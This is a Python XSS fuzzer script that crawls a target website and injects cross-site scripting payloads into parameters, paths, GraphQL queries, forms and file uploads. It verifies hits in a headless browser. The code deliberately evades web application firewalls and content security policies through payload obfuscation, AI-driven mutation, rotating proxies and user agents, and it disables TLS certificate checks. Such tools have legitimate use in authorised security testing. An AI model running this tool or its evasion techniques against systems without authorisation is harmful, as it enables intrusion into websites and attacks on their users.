#!/usr/bin/env python3
"""
  • Haroon Ahmad Awan | haroon@cyberzeus.pk | Cyber Zeus

Usage:
  python3 ULTRA_DYNAMIC_ENTERPRISE_XSS_FUZZER.py \
      --url https://target.com \
      [--threads 30] [--debug] [--playwright] \
      [--proxyList proxies.txt] [--output report.md]

"""

import argparse
import logging
import random
import re
import sys
import time
from io import BytesIO
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from bs4 import BeautifulSoup

# Optional color library
try:
    from termcolor import colored
except ImportError:
    def colored(x, color=None, attrs=None): return x

requests.packages.urllib3.disable_warnings()

###############################################################################
# GLOBALS & CONFIG
###############################################################################
DEPTH        = 2      # BFS depth
THREADS      = 24     # concurrency
TIMEOUT      = 10     # request timeout
SLEEP        = (1,2)  # base wait for 429
BACKOFF      = 2      # exponential back-off
BASE_HEADERS = {"Accept": "*/*"}

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
]

logger = logging.getLogger("DYNAMIC_ENTERPRISE_XSS")
logger.setLevel(logging.INFO)
handler = logging.StreamHandler(sys.stdout)
logger.addHandler(handler)

def debug(msg): logger.debug(msg)
def info(msg):  logger.info(msg)

def color_out(txt, color="green", attrs=None):
    """Wrapper for color output."""
    return colored(txt, color=color, attrs=attrs)

###############################################################################
# AI Mutation (CodeBERT)
###############################################################################
AI = False
AI_DEVICE = "cpu"

try:
    import torch
    from transformers import RobertaForMaskedLM, RobertaTokenizerFast
    if torch.cuda.is_available():
        AI_DEVICE="cuda"
        debug("Found CUDA device, using GPU for CodeBERT")

    _tok = RobertaTokenizerFast.from_pretrained("microsoft/codebert-base")
    _mdl = RobertaForMaskedLM.from_pretrained("microsoft/codebert-base")
    _mdl.to(AI_DEVICE)
    _mdl.eval()
    AI = True
except ImportError:
    pass

def ai_mutate(payload: str) -> str:
    if not AI:
        return payload
    import torch
    tokens = _tok.tokenize(payload)
    if len(tokens) < 2:
        return payload
    idx = random.randrange(len(tokens))
    tokens[idx] = _tok.mask_token
    ids = _tok.convert_tokens_to_ids(tokens)
    tin = torch.tensor([ids]).to(AI_DEVICE)
    with torch.no_grad():
        logits = _mdl(tin)["logits"][0, idx]
    new_id = int(logits.topk(3).indices[0])
    mutated_token = _tok.convert_ids_to_tokens(new_id)
    tokens[idx] = mutated_token
    return _tok.convert_tokens_to_string(tokens)

###############################################################################
# OPTIONAL: Rotating Proxy & Auth/Cookie Stubs
###############################################################################
PROXIES = []
CUR_PROXY_IDX = 0
SESSION_COOKIES = {}
AUTH_HEADER = None

def load_proxies(proxyfile):
    global PROXIES
    try:
        with open(proxyfile,"r") as f:
            lines = [ln.strip() for ln in f if ln.strip()]
            PROXIES = lines
        info(f"Loaded {len(PROXIES)} proxies from {proxyfile}")
    except IOError:
        info(f"Could not read proxies from {proxyfile}")

def get_next_proxy():
    global CUR_PROXY_IDX, PROXIES
    if not PROXIES:
        return None
    px = PROXIES[CUR_PROXY_IDX % len(PROXIES)]
    CUR_PROXY_IDX += 1
    return {"http": px, "https": px}

def set_auth_header(token):
    global AUTH_HEADER
    AUTH_HEADER = token  # e.g. "Bearer xyz" or "Basic abc"

def set_cookie(name, value):
    global SESSION_COOKIES
    SESSION_COOKIES[name]=value

###############################################################################
# HTTP / BACKOFF
###############################################################################
def rand_headers():
    hdr = dict(BASE_HEADERS)
    hdr["User-Agent"] = random.choice(UA_POOL)
    if AUTH_HEADER:
        hdr["Authorization"] = AUTH_HEADER
    return hdr

def backoff_request(method, *args, **kwargs):
    """Wrap requests with naive 429 back-off + rotating proxy + cookies."""
    px = get_next_proxy()
    if px:
        kwargs["proxies"] = px

    cjar = requests.cookies.RequestsCookieJar()
    for k,v in SESSION_COOKIES.items():
        cjar.set(k,v)

    delay = random.uniform(*SLEEP)
    for _ in range(5):
        try:
            r = method(*args, **kwargs, cookies=cjar, verify=False, timeout=TIMEOUT)
            if r and r.status_code==429:
                time.sleep(delay)
                delay *= BACKOFF
                continue
            return r
        except requests.exceptions.RequestException as ex:
            debug(f"HTTP error: {ex}, sleeping {delay:.2f}")
            time.sleep(delay)
            delay *= BACKOFF
    return None

###############################################################################
# EXTENDED PAYLOAD CORPUS
###############################################################################
BASE_PAYLOADS = [
    # Include 60+ payloads, snippet for brevity
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    # ...
]

def polymorph(pl:str)->str:
    """Case randomization + minimal comment breaks for script/alert."""
    out=[]
    for c in pl:
        out.append(c.upper() if random.random()<0.5 else c.lower())
    mutated = "".join(out)
    mutated = re.sub(r"<script", "<scr/*X*/ipt", mutated, flags=re.IGNORECASE)
    mutated = re.sub(r"</script>", "</scr/*X*/ipt>", mutated, flags=re.IGNORECASE)
    mutated = re.sub(r"alert", "\\u0061lert", mutated, flags=re.IGNORECASE)
    return mutated

def advanced_obfuscate(pl: str)->str:
    """Extra breaks or partial hex to bypass naive WAF."""
    pl2 = re.sub(r"script", "scri<!-- -->pt", pl, flags=re.IGNORECASE)
    pl2 = re.sub(r"alert", "al%09ert", pl2, flags=re.IGNORECASE)
    return pl2

def build_base_payloads():
    out = set()
    for p in BASE_PAYLOADS:
        out.add(p)
        out.add(polymorph(p))
        if AI:
            out.add(ai_mutate(p))
    return list(out)

###############################################################################
# CSP / WAF DETECTION
###############################################################################
def inspect_security(r):
    sec = {"strict_csp": False, "waf": False}
    if not r: return sec

    # WAF check
    s = (r.headers.get("Server","") or "").lower()
    if "cloudflare" in s:
        sec["waf"]=True
    for k in r.headers:
        if k.lower().startswith("cf-"):
            sec["waf"]=True

    # CSP
    csp = (r.headers.get("Content-Security-Policy") or "").lower()
    if csp:
        if "script-src" in csp and "unsafe-inline" not in csp:
            sec["strict_csp"]=True
        if any(x in csp for x in ["nonce-","sha256-","strict-dynamic"]):
            sec["strict_csp"]=True
    return sec

###############################################################################
# BFS CRAWLER
###############################################################################
def fetch_html(url):
    r = backoff_request(requests.get, url, headers=rand_headers())
    if r and r.status_code==200:
        return r.text, r
    return None, r

def same_domain(base, tgt):
    return urlparse(base).netloc == urlparse(tgt).netloc

def crawl(root, depth=DEPTH):
    visited = set([root])
    q = [(root,0)]
    pages=[]
    while q:
        url,d = q.pop(0)
        html, resp = fetch_html(url)
        if not html: continue
        pages.append((url,html,resp))
        if d<depth:
            # gather <a href="...">
            for link in re.findall(r'href=[\'"](.*?)[\'"]', html):
                full=urljoin(url, link)
                if same_domain(root,full) and full not in visited:
                    visited.add(full)
                    q.append((full,d+1))

            # gather fetch/.ajax
            for ep in re.findall(r'(?:fetch|\.ajax)\(["\']([^"\']+)["\']', html):
                full=urljoin(url,ep)
                if same_domain(root,full) and full not in visited:
                    visited.add(full)
                    q.append((full,d+1))
    return pages

def endpoints_from_js(html, base):
    s=set()
    for m in re.findall(r'fetch\(["\'](.*?)["\']',html):
        s.add(urljoin(base,m))
    if "/graphql" in html:
        s.add(urljoin(base,"/graphql"))
    return s

def forms_from_html(html, base):
    soup=BeautifulSoup(html,"html.parser")
    ret=[]
    for f in soup.find_all("form"):
        act=f.get("action") or base
        full=urljoin(base,act)
        mtd=(f.get("method") or "get").lower()
        ins, fls=[], []
        for i in f.find_all(["input","textarea"]):
            nm=i.get("name")
            ty=i.get("type") or "text"
            if nm:
                if ty=="file":
                    fls.append(nm)
                else:
                    ins.append(nm)
        ret.append((full,mtd,ins,fls))
    return ret

###############################################################################
# COLOR FORMATTING + TIMING
###############################################################################
def format_finding(elapsed, vuln_name, detail):
    t_str = color_out(f"[{elapsed:.3f}s]", "cyan")
    v_str = color_out(vuln_name, "red", attrs=["bold"])
    arrow = color_out(" => ", "yellow")
    return f"{t_str} {v_str}{arrow}{detail}"

###############################################################################
# BASE TESTS: GET/POST/PATH/GRAPHQL/FORM
###############################################################################
def test_get(url,param,payload):
    t0=time.time()
    r=backoff_request(requests.get,url,params={param:payload},headers=rand_headers())
    dur=time.time()-t0
    if r and payload in (r.text or ""):
        return format_finding(dur,"Reflected XSS (GET)",f"{url}?{param}={payload}")

def test_post(url,field,payload):
    t0=time.time()
    r=backoff_request(requests.post,url,data={field:payload},headers=rand_headers())
    dur=time.time()-t0
    if r and payload in (r.text or ""):
        return format_finding(dur,"Reflected XSS (POST)",f"{url} (field={field})")

def test_path(url,payload):
    if not url.endswith("/"):
        url=url.rstrip("/")
    target=f"{url}/{payload}"
    t0=time.time()
    r=backoff_request(requests.get,target,headers=rand_headers())
    dur=time.time()-t0
    if r and payload in (r.text or ""):
        return format_finding(dur,"Path Injection",target)

def test_graphql(url,payload):
    if not url.endswith("/graphql"):
        return None
    t0=time.time()
    q1={"query":"query{__typename}"}
    ok=backoff_request(requests.post,url,json=q1,headers={"Content-Type":"application/json"})
    if not ok or ok.status_code!=200: return None
    q2={"query":"query($x:String!){__typename}","variables":{"x":payload}}
    r=backoff_request(requests.post,url,json=q2,headers={"Content-Type":"application/json"})
    dur=time.time()-t0
    if r and payload in (r.text or ""):
        return format_finding(dur,"GraphQL Reflection",url)

def fuzz_form(action,mtd,inputs,files,payload):
    found=[]
    for i in inputs:
        out=None
        if mtd=="get":
            out=test_get(action,i,payload)
        else:
            out=test_post(action,i,payload)
        if out:
            found.append(out)
    for f in files:
        t0=time.time()
        data=BytesIO(payload.encode())
        rr=backoff_request(requests.post,action,
                           files={f:("poc.svg",data,"image/svg+xml")},
                           headers=rand_headers())
        dur=time.time()-t0
        if rr and payload in (rr.text or ""):
            found.append(format_finding(dur,"File Upload XSS",f"{action} (file={f})"))
    return found if found else None

###############################################################################
# EXOTIC
###############################################################################
EXOTIC_VECTORS={
    "wtXSS":("WebTransport Attack","wtxss","GET"),
    "wsXSS":("WASM Attack","wasmpayload","POST"),
    "shXSS":("Shadow DOM Attack","shadowRootData","GET"),
    "swXSS":("ServiceWorker Attack","swpayload","GET"),
    "pxXSS":("postMessage XSS","postMessage","GET"),
    "dpXSS":("DOMPoly Attack","dompoly","GET"),
    "dragXSS":("Drag&Drop Injection","dragData","GET"),
    "rloXSS":("RLO Filename Trick","filename","GET"),
    "homXSS":("Homoglyph Spoofing","homoglyph","GET"),
    "txXSS":("Trusted Types Bypass","ttbypass","GET"),
    "vxXSS":("Vector Morphing","vx","GET"),
    "wxXSS":("WebWorker Attack","wkpayload","GET"),
    "ceoXSS":("CE-Origin Attack","ceoFrame","GET"),
    "cdXSS":("Cross-Document Scripting","cdIframe","GET"),
    "aiXSS":("AI Template Injection","aiPrompt","GET"),
    "clXSS":("Cross-Layer Attack","layeredInput","GET"),
    "cmXSS":("Cross-MIME Execution","file","POST"),
    "fdXSS":("FormData Attack","blobdata","POST"),
}

def test_exotic(vec, url, payload):
    if vec not in EXOTIC_VECTORS:
        return None
    name, param, method = EXOTIC_VECTORS[vec]
    t0=time.time()
    try:
        if vec=="wsXSS":
            wasm_url=url.rstrip("/")+"/module.wasm"
            r=backoff_request(requests.post,wasm_url,data=payload,headers=rand_headers())
            dur=time.time()-t0
            if r and payload in (r.text or ""):
                return format_finding(dur,name,wasm_url)
            return None
        elif vec=="wxXSS":
            wjs=urljoin(url,"worker.js")
            r=backoff_request(requests.get,wjs,params={param:payload},headers=rand_headers())
            dur=time.time()-t0
            if r and payload in (r.text or ""):
                return format_finding(dur,name,wjs)
            return None
        elif vec=="swXSS":
            swjs=urljoin(url,"sw.js")
            r=backoff_request(requests.get,swjs,params={param:payload},headers=rand_headers())
            dur=time.time()-t0
            if r and payload in (r.text or ""):
                return format_finding(dur,name,swjs)
            return None
        elif vec=="cmXSS":
            data=BytesIO(payload.encode())
            rr=backoff_request(requests.post,url,
                               files={param:("fake.gif",data,"image/gif")},
                               headers=rand_headers())
            dur=time.time()-t0
            if rr and payload in (rr.text or ""):
                return format_finding(dur,name,url)
            return None
        elif vec=="fdXSS":
            try:
                from requests_toolbelt.multipart.encoder import MultipartEncoder
            except ImportError:
                print(color_out("[!] Missing requests_toolbelt for fdXSS", "red"))
                return None
            enc=MultipartEncoder(fields={param:("blob.txt",payload,"text/plain")})
            rr=backoff_request(requests.post,url,data=enc,
                               headers={"Content-Type":enc.content_type,**rand_headers()})
            dur=time.time()-t0
            if rr and payload in (rr.text or ""):
                return format_finding(dur,name,url)
            return None
        elif vec=="vxXSS":
            r=backoff_request(requests.get,url,
                              params={"part1":"<scr","part2":"ipt>", param:payload},
                              headers=rand_headers())
            dur=time.time()-t0
            if r and payload in (r.text or ""):
                return format_finding(dur,name,url)
            return None
        else:
            # generic param injection
            if method=="GET":
                rr=backoff_request(requests.get,url,params={param:payload},headers=rand_headers())
            else:
                rr=backoff_request(requests.post,url,data={param:payload},headers=rand_headers())
            dur=time.time()-t0
            if rr and payload in (rr.text or ""):
                return format_finding(dur,name,url)
            return None
    except Exception as e:
        print(color_out(f"[EXOTIC ERROR] {vec} => {e}", "red"))
        return None

###############################################################################
# PLAYWRIGHT VERIFICATION
###############################################################################
def verify_with_playwright(results):
    """Try each discovered URL in a headless browser for 2s to see if alert/prompt fires."""
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        debug("Playwright not installed; skipping.")
        return

    debug("Starting Playwright verification...")
    verified=set()
    candidates=[]
    for f in results:
        # e.g. "[1.234s] Reflected XSS => http://..."
        m=re.search(r"=>\s+(https?://\S+)", f)
        if m:
            candidates.append(m.group(1))

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        def on_dialog(d):
            verified.add(d.message)
            d.dismiss()
        page.on("dialog", on_dialog)
        for link in candidates:
            debug(f"Visiting {link} in Playwright..")
            try:
                page.goto(link, wait_until="networkidle")
                time.sleep(2)
            except Exception as ex:
                debug(f"Playwright error on {link}: {ex}")
        browser.close()

    if verified:
        debug(f"Dialog triggered: {verified}")
    else:
        debug("No alerts/prompt encountered in browser check.")

###############################################################################
# MARKDOWN OUTPUT
###############################################################################
def save_findings_md(findings, filename):
    with open(filename,"w",encoding="utf-8") as f:
        f.write("# XSS Findings\n\n")
        f.write("|Index|Vulnerability|Detail|\n")
        f.write("|-----|-------------|------|\n")
        for i, line in enumerate(findings,1):
            # e.g. "[1.234s] Reflected XSS => http://..."
            m = re.match(r'\[(.*?)s\]\s(.*?) => (.*)', line)
            if m:
                timing=m.group(1)
                vul=m.group(2)
                det=m.group(3)
            else:
                timing="?"
                vul="???"
                det=line
            f.write(f"|{i}|{vul} ({timing}s)|{det}|\n")
    info(f"Findings saved to {filename}")

###############################################################################
# TASK WRAPPER
###############################################################################
def run_task(task):
    fn,args = task
    return fn(*args)

###############################################################################
# MAIN
###############################################################################
def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="Target root URL")
    ap.add_argument("--threads",type=int,default=THREADS,help="Concurrency level")
    ap.add_argument("--debug", action="store_true", help="Enable debug logs")
    ap.add_argument("--playwright", action="store_true", help="Attempt headless verification")
    ap.add_argument("--proxyList",help="Optional file with proxies for rotating usage")
    ap.add_argument("--output",default="findings.md",help="Markdown output filename")

    args=ap.parse_args()

    if args.debug:
        logger.setLevel(logging.DEBUG)
        debug("Debug mode on")

    if args.proxyList:
        load_proxies(args.proxyList)

    info(color_out(f"Starting ULTRA-DYNAMIC XSS fuzzer on: {args.url}", "blue"))

    pages=crawl(args.url, DEPTH)
    info(f"Crawled {len(pages)} pages at depth={DEPTH}.")

    # Check for WAF/CSP
    waf=False
    strict_csp=False
    for (u,html,r) in pages:
        if r:
            sec=inspect_security(r)
            if sec["waf"]: waf=True
            if sec["strict_csp"]: strict_csp=True
            if waf or strict_csp:
                break

    if waf:
        info(color_out("[!] Detected possible WAF/Cloudflare. We'll obfuscate payloads more.", "magenta"))
    if strict_csp:
        info(color_out("[!] Detected strict CSP. We'll apply advanced obfuscation for inline scripts.", "magenta"))

    # Build base corpus
    base_payloads = build_base_payloads()
    if waf or strict_csp:
        base_payloads = [advanced_obfuscate(x) for x in base_payloads]

    info(f"Final base payload corpus: {len(base_payloads)} (AI={AI})")

    # Gather endpoints + forms
    endpoints=set()
    forms=[]
    for (u,html,r) in pages:
        endpoints.add(u)
        if html:
            es = endpoints_from_js(html,u)
            for e in es:
                endpoints.add(e)
            fs = forms_from_html(html,u)
            forms.extend(fs)

    info(f"Discovered {len(endpoints)} endpoints + {len(forms)} forms to fuzz.")

    # Build tasks
    tasks=[]
    # Standard
    for ep in endpoints:
        for p in base_payloads:
            tasks.append((test_get,(ep,"q",p)))
            tasks.append((test_post,(ep,"input",p)))
            tasks.append((test_path,(ep,p)))
            tasks.append((test_graphql,(ep,p)))

    # Forms
    for (act,mtd,ins,fls) in forms:
        for p in base_payloads:
            tasks.append((fuzz_form,(act,mtd,ins,fls,p)))

    # Exotic
    for vec in EXOTIC_VECTORS.keys():
        for ep in endpoints:
            for xp in base_payloads:
                tasks.append((test_exotic,(vec,ep,xp)))

    info(f"[>] Launching {len(tasks)} tasks with concurrency={args.threads}...")
    findings=[]
    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futs=[pool.submit(run_task,t) for t in tasks]
        for fut in as_completed(futs):
            res=fut.result()
            if res:
                if isinstance(res,list):
                    findings.extend(res)
                    for x in res:
                        info(x)
                else:
                    findings.append(res)
                    info(res)

    # Playwright?
    if args.playwright:
        verify_with_playwright(findings)

    # Save
    if findings:
        info(color_out(f"Total {len(findings)} potential hits found!", "yellow"))
        save_findings_md(findings,args.output)
    else:
        info(color_out("No XSS findings reported.", "yellow"))

    # disclaimers
    info("\n===== ULTRA-DYNAMIC XSS FUZZ COMPLETE =====")
    info(">>> Note: Real advanced CSP/WAF evasion may require external scripts or polyglots.")
    info(">>> Rate-limit stealth might need IP rotation & random intervals beyond this naive approach.")
    info(">>> Playwright test only checks immediate 'alert()'; deeper flows might be missed.")
    info(">>> Use responsibly & legally. Best of luck!\n")

if __name__=="__main__":
    main()
